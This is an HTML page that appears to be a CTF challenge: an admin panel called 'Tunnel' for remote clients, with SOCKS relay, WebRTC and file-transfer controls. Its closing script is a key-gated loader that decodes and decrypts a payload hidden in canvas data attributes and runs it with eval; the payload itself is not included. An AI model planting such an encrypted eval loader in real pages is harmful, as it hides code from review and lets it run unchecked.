<!DOCTYPE html>
<html lang="en"><head>
    <meta charset="UTF-8">
    <title>Tunnel · Admin</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap');

        :root {
            --bg: #f8f9fa;
            --surface: #ffffff;
            --border: #e2e5e9;
            --border-mid: #c8cdd4;
            --text: #1a1d23;
            --muted: #8b919e;
            --accent: #2563eb;
            --accent-bg: #eff4ff;
            --inbound: #16a34a;
            --inbound-bg: #f0fdf4;
            --warn: #d97706;
            --warn-bg: #fffbeb;
            --err: #dc2626;
            --err-bg: #fef2f2;
            --sidebar-w: 240px;
            --radius: 6px;
            --font-ui: 'Inter', system-ui, sans-serif;
            --font-mono: 'JetBrains Mono', monospace;
        }

        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html,
        body {
            height: 100%;
            overflow: hidden;
        }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: var(--font-ui);
            font-size: 14px;
            display: flex;
            flex-direction: column;
        }

        header {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 14px 24px;
            background: var(--surface);
            border-bottom: 1px solid var(--border);
            flex-shrink: 0;
            z-index: 10;
        }

        header h1 {
            font-size: 15px;
            font-weight: 600;
            letter-spacing: -0.01em;
        }

        .badge {
            font-size: 11px;
            font-weight: 500;
            color: var(--muted);
            background: var(--bg);
            border: 1px solid var(--border);
            padding: 2px 8px;
            border-radius: 20px;
        }

        .badge.peer {
            background: var(--inbound-bg);
            border-color: var(--inbound);
            color: var(--inbound);
        }

        header .spacer {
            flex: 1;
        }

        #header_status {
            font-size: 12px;
            color: var(--muted);
            font-family: var(--font-mono);
        }

        /* ── SOCKS status pill in header ── */
        #socks_status {
            font-size: 11px;
            font-family: var(--font-mono);
            color: var(--muted);
            display: flex;
            align-items: center;
            gap: 5px;
        }

        #socks_pip {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: var(--muted);
            flex-shrink: 0;
            transition: background .3s, box-shadow .3s;
        }

        #socks_pip.on {
            background: var(--inbound);
            box-shadow: 0 0 6px var(--inbound);
        }

        #socks_pip.err {
            background: var(--err);
            box-shadow: 0 0 6px var(--err);
        }

        .main {
            display: flex;
            flex: 1;
            overflow: hidden;
        }

        /* ── Sidebar ── */
        .sidebar {
            width: var(--sidebar-w);
            border-right: 1px solid var(--border);
            background: var(--surface);
            display: flex;
            flex-direction: column;
            flex-shrink: 0;
            overflow: hidden;
        }

        .sidebar-section {
            border-bottom: 1px solid var(--border);
            flex-shrink: 0;
        }

        .sidebar-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 14px;
        }

        .sidebar-label {
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: .06em;
            color: var(--muted);
        }

        .btn-sm {
            background: none;
            border: 1px solid var(--border);
            border-radius: 4px;
            padding: 3px 9px;
            font-size: 11px;
            font-family: var(--font-ui);
            font-weight: 500;
            color: var(--muted);
            cursor: pointer;
            transition: border-color .15s, color .15s;
        }

        .btn-sm:hover {
            border-color: var(--accent);
            color: var(--accent);
        }

        .client-list {
            overflow-y: auto;
            padding: 6px;
            display: flex;
            flex-direction: column;
            gap: 2px;
            max-height: 160px;
        }

        .client-row {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 7px 10px;
            border-radius: var(--radius);
            cursor: pointer;
            transition: background .1s;
            user-select: none;
        }

        .client-row:hover {
            background: var(--bg);
        }

        .client-row.selected {
            background: var(--accent-bg);
        }

        .client-row .dot {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: var(--inbound);
            flex-shrink: 0;
        }

        .client-row .cid {
            font-family: var(--font-mono);
            font-size: 12px;
            color: var(--text);
            flex: 1;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .client-row.selected .cid {
            color: var(--accent);
            font-weight: 500;
        }

        #no_clients {
            padding: 10px 14px;
            font-size: 12px;
            color: var(--muted);
        }

        /* ICE config */
        .ice-section {
            padding: 10px 14px;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        #ice_config {
            font-family: var(--font-mono);
            font-size: 11px;
            color: var(--text);
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 8px 10px;
            outline: none;
            resize: vertical;
            min-height: 90px;
            max-height: 180px;
            transition: border-color .15s;
            line-height: 1.4;
        }

        #ice_config:focus {
            border-color: var(--accent);
        }

        #btn_connect {
            background: var(--accent);
            border: none;
            border-radius: var(--radius);
            color: #fff;
            font-family: var(--font-ui);
            font-weight: 600;
            font-size: 12px;
            padding: 8px;
            cursor: pointer;
            transition: background .15s;
        }

        #btn_connect:hover {
            background: #1d4ed8;
        }

        #btn_connect:disabled {
            opacity: .4;
            cursor: not-allowed;
        }

        /* Broker status */
        #broker_status {
            padding: 8px 14px;
            font-size: 11px;
            color: var(--warn);
            font-family: var(--font-mono);
            background: var(--warn-bg);
            border-top: 1px solid #fde68a;
            display: none;
            line-height: 1.5;
        }

        #broker_status.active {
            display: block;
        }

        /* ── Chat ── */
        .chat {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .chat-header {
            padding: 11px 20px;
            border-bottom: 1px solid var(--border);
            background: var(--surface);
            font-size: 12px;
            color: var(--muted);
            font-family: var(--font-mono);
            flex-shrink: 0;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .chat-header .target {
            color: var(--accent);
            font-weight: 500;
        }

        .transport-pill {
            font-size: 10px;
            padding: 1px 7px;
            border-radius: 20px;
            border: 1px solid var(--border);
            color: var(--muted);
            background: var(--bg);
        }

        .transport-pill.peer {
            background: var(--inbound-bg);
            border-color: var(--inbound);
            color: var(--inbound);
        }

        #message_log {
            flex: 1;
            overflow-y: auto;
            padding: 16px 20px;
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        #message_log::-webkit-scrollbar {
            width: 6px;
        }

        #message_log::-webkit-scrollbar-thumb {
            background: var(--border-mid);
            border-radius: 3px;
        }

        .msg {
            display: flex;
            align-items: baseline;
            gap: 10px;
            padding: 8px 12px;
            border-radius: var(--radius);
            animation: fadeIn .15s ease;
            line-height: 1.5;
        }

        .msg:hover {
            filter: brightness(.97);
        }

        .msg:hover .copy-btn {
            opacity: 1;
        }

        .msg.inbound {
            background: var(--inbound-bg);
        }

        .msg.outbound {
            background: var(--accent-bg);
        }

        .msg.system {
            background: var(--warn-bg);
        }

        .msg.error {
            background: var(--err-bg);
        }

        .msg .ts {
            font-size: 11px;
            font-family: var(--font-mono);
            color: var(--muted);
            flex-shrink: 0;
            user-select: none;
        }

        .msg .who {
            font-size: 11px;
            font-weight: 600;
            flex-shrink: 0;
            user-select: none;
            min-width: 60px;
            font-family: var(--font-mono);
        }

        .msg.inbound .who {
            color: var(--inbound);
        }

        .msg.outbound .who {
            color: var(--accent);
        }

        .msg.system .who {
            color: var(--warn);
        }

        .msg.error .who {
            color: var(--err);
        }

        .msg .body {
            flex: 1;
            font-family: var(--font-mono);
            font-size: 13px;
            color: var(--text);
            word-break: break-all;
            white-space: pre-wrap;
        }

        .msg.error .body {
            color: var(--err);
        }

        .msg.system .body {
            color: var(--warn);
        }

        .copy-btn {
            opacity: 0;
            flex-shrink: 0;
            background: none;
            border: 1px solid var(--border-mid);
            border-radius: 4px;
            padding: 2px 7px;
            font-size: 11px;
            font-family: var(--font-ui);
            font-weight: 500;
            color: var(--muted);
            cursor: pointer;
            transition: border-color .15s, color .15s, opacity .15s;
            user-select: none;
        }

        .copy-btn:hover {
            border-color: var(--accent);
            color: var(--accent);
        }

        .copy-btn.copied {
            color: var(--inbound);
            border-color: var(--inbound);
            opacity: 1;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(3px);
            }

            to {
                opacity: 1;
                transform: none;
            }
        }

        .compose-bar {
            display: flex;
            gap: 10px;
            padding: 16px 20px;
            background: var(--surface);
            border-top: 1px solid var(--border);
            flex-shrink: 0;
            align-items: center;
        }

        #admin_input {
            flex: 1;
            font-family: var(--font-mono);
            font-size: 13px;
            color: var(--text);
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            padding: 10px 14px;
            outline: none;
            transition: border-color .15s, box-shadow .15s;
        }

        #admin_input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, .1);
        }

        #admin_input::placeholder {
            color: var(--muted);
        }

        #admin_input:disabled {
            opacity: .5;
            cursor: not-allowed;
        }

        #btn_send {
            background: var(--accent);
            border: none;
            border-radius: var(--radius);
            color: #fff;
            font-family: var(--font-ui);
            font-weight: 600;
            font-size: 13px;
            padding: 10px 20px;
            cursor: pointer;
            flex-shrink: 0;
            transition: background .15s, box-shadow .15s;
        }

        #btn_send:hover {
            background: #1d4ed8;
            box-shadow: 0 2px 8px rgba(37, 99, 235, .3);
        }

        #btn_send:active {
            background: #1e40af;
        }

        #btn_send:disabled {
            opacity: .4;
            cursor: not-allowed;
            box-shadow: none;
            background: var(--accent);
        }

        /* file transfer */
        #btn_file {
            background: none;
            border: 1px solid var(--border-mid);
            border-radius: var(--radius);
            color: var(--muted);
            font-size: 18px;
            line-height: 1;
            padding: 8px 12px;
            cursor: pointer;
            flex-shrink: 0;
            transition: border-color .15s, color .15s;
        }

        #btn_file:hover {
            border-color: var(--accent);
            color: var(--accent);
        }

        #btn_file:disabled {
            opacity: .3;
            cursor: not-allowed;
        }
    </style>
</head>

<body>

    <header>
        <h1>Tunnel</h1>
        <span class="badge">admin</span>
        <div class="spacer"></div>
        <!-- ── SOCKS relay status ── -->
        <div id="socks_status">
            <span id="socks_pip"></span>
            <span id="socks_label">socks relay: disconnected</span>
        </div>
        <span id="header_status">connecting…</span>
    </header>

    <div class="main">
        <aside class="sidebar">
            <div class="sidebar-section">
                <div class="sidebar-header">
                    <span class="sidebar-label">Clients</span>
                    <button class="btn-sm" id="btn_refresh">Refresh</button>
                </div>
                <div class="client-list" id="client_list">
                    <div id="no_clients">No clients online.</div>
                </div>
            </div>

            <div class="sidebar-section">
                <div class="ice-section">
                    <span class="sidebar-label">STUN / TURN config</span>
                    <textarea id="ice_config" spellcheck="false">{
  "iceServers": [
    { "urls": "stun:stun.l.google.com:19302" }
  ]
}</textarea>
                    <button id="btn_connect" disabled="">Initiate WebRTC</button>
                    <button id="btn_disconnect" disabled="" style="background:none;border:1px solid var(--err);color:var(--err);border-radius:var(--radius);padding:8px;font-family:var(--font-ui);font-weight:600;font-size:12px;cursor:pointer;margin-top:2px;" onmouseover="this.style.background='var(--err-bg)'" onmouseout="this.style.background='none'">Disconnect</button>
                </div>
            </div>

            <div id="broker_status"></div>
        </aside>

        <div class="chat">
            <div class="chat-header" id="chat_header">Select a client to begin</div>
            <div id="message_log"></div>
            <div class="compose-bar">
                <input id="admin_input" type="text" placeholder="Select a client first…" autocomplete="off" disabled="">
                <button id="btn_file" title="Send file" disabled="">📎</button>
                <input id="file_input" type="file" style="display:none">
                <button id="btn_send" disabled="">Send</button>
            </div>
        </div>
    </div>

<script>(async function(){
function _ctfError(msg){ document.body.style.cssText="background:#000;color:#f00;font:1rem monospace;padding:2rem;white-space:pre"; document.body.textContent="[CTF] "+msg; }

/* ── KEY PROVIDER ── */
const key = prompt("Enter the key:");
if (!key) { _ctfError("No key supplied."); return; }

/* ── ENCODE/DECODE ── */
function fetchPayloads(){
  const c=document.getElementById("pd-canvas");
  if(!c) return [];
  return [c.dataset.p+"|"+c.dataset.len];
}
function decode(s){
  const [b64,lenStr]=s.split("|");
  const len=parseInt(lenStr);
  const raw=atob(b64);
  const bytes=new Uint8Array(len);
  for(let i=0;i<len;i++) bytes[i]=raw.charCodeAt(i*4);
  return new TextDecoder().decode(bytes);
}

/* ── DECRYPT ── */
async function decrypt(hex, key) {
  async function dk(key){const h=await crypto.subtle.digest("SHA-256",new TextEncoder().encode(key));const v=new DataView(h);return[v.getUint32(0),v.getUint32(4),v.getUint32(8),v.getUint32(12)];}
  function db(v0,v1,k){const D=0x9E3779B9;let s=(D*32)>>>0;for(let i=0;i<32;i++){v1=(v1-(((v0<<4^v0>>>5)+v0)^(s+k[s>>>11&3])))>>>0;s=(s-D)>>>0;v0=(v0-(((v1<<4^v1>>>5)+v1)^(s+k[s&3])))>>>0;}return[v0,v1];}
  const k=await dk(key);
  const bytes=new Uint8Array(hex.match(/.{2}/g).map(h=>parseInt(h,16)));
  const out=new Uint8Array(bytes.length);
  const dv=new DataView(bytes.buffer),ov=new DataView(out.buffer);
  for(let i=0;i<bytes.length;i+=8){const[a,b]=db(dv.getUint32(i),dv.getUint32(i+4),k);ov.setUint32(i,a);ov.setUint32(i+4,b);}
  const len=new DataView(out.buffer).getUint32(0);
  return new TextDecoder().decode(out.slice(4,4+len));
}

/* ── PIPELINE ── */
async function run(){
  for(const raw of fetchPayloads()){
    const decoded=decode(raw);
    const src=await decrypt(decoded,key);
    (0,eval)(src);
  }
}
run().catch(e=>_ctfError("Runtime error: "+e.message));
